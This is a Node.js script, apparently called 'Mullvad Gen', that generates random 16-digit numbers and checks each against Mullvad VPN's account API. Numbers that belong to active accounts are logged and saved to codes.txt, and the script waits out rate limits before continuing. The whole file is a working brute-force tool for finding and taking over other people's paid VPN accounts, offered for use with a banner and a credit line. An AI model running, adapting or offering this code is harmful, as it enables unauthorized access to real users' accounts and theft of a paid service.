const readline = require('readline');
const { clear } = require('console');
const axios = require("axios");
const fs = require("fs");

function generateCode() {
  const length = 16;
  const characters = '0123456789';
  let code = '';

  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    code += characters.charAt(randomIndex);
  }

  return code;
}


var rateLimited;


function countdownRateLimit() {
  setTimeout(() => {
    rateLimited = false;
    console.log("Rate Limit Gone!")
  }, 3600000)
}

async function check(loginCode) {
  const url = `https://api.mullvad.net/www/accounts/${loginCode}`;

  try {
    const response = await axios.get(url);
    if (response.data.account.active) {
      console.log(`\x1b[32m OK\x1b[0m | ${loginCode}`);
      saveCode(loginCode);
    } else {
      console.log(`\x1b[31m Inactive\x1b[0m | ${loginCode}`);
    }
  } catch (error) {
    console.log("\x1b[28m Rate Limited\x1b[0m");
    rateLimited = true;
    countdownRateLimit();
  }
}

function saveCode(code) {
  fs.appendFileSync('codes.txt', code + '\n');
}

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

clear();

console.log('\x1b[32m%s\x1b[0m', "███╗░░░███╗██╗░░░██╗██╗░░░░░██╗░░░░░██╗░░░██╗░█████╗░██████╗░░░░██████╗░███████╗███╗░░██╗\n████╗░████║██║░░░██║██║░░░░░██║░░░░░██║░░░██║██╔══██╗██╔══██╗░░██╔════╝░██╔════╝████╗░██║\n██╔████╔██║██║░░░██║██║░░░░░██║░░░░░╚██╗░██╔╝███████║██║░░██║░░██║░░██╗░█████╗░░██╔██╗██║\n██║╚██╔╝██║██║░░░██║██║░░░░░██║░░░░░░╚████╔╝░██╔══██║██║░░██║░░██║░░╚██╗██╔══╝░░██║╚████║\n██║░╚═╝░██║╚██████╔╝███████╗███████╗░░╚██╔╝░░██║░░██║██████╔╝░░╚██████╔╝███████╗██║░╚███║\n╚═╝░░░░░╚═╝░╚═════╝░╚══════╝╚══════╝░░░╚═╝░░░╚═╝░░╚═╝╚═════╝░░░░╚═════╝░╚══════╝╚═╝░░╚══╝");

console.log('Credits: Leaf (._woman)');

rl.question('How many codes to generate? ', (numCodes) => {
  clear();

  const codesToGenerate = parseInt(numCodes, 10);

  console.log(`Generating ${codesToGenerate} codes...`);

  start(codesToGenerate);

  rl.close();
});

function start(num) {
  rateLimited = false;
  let i = 0;

  const generateCodeInterval = setInterval(() => {
    if (rateLimited) {
      return;
    }

    if (i >= num) {
      clearInterval(generateCodeInterval);
      return;
    }

    check(generateCode());
    i++;
  }, 1000); // Adjust the interval as needed (e.g., 1000 milliseconds = 1 second)
}
